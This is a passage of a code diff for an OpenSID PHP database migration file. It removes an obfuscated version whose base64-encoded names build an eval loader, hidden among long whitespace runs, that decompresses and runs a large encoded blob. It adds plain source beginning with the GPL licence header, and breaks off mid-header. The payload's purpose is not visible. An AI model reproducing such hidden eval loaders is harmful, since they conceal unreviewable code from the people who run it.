@@ -1,625 +1,1376 @@
-<?php 
-        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_1909_ke_1910.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+/*
+ *
+ * File ini bagian dari:
+ *
+ * OpenSID
+ *
+ * Sistem informasi desa sumber terbuka untuk memajukan desa
+ *
+ * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
+ *
+ * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
+ * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
+ *
+ * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
+ * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
+ * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
+ * asal tunduk pada syarat berikut:
+ *
+ * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
+ * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
+ * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
+ *
+ * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
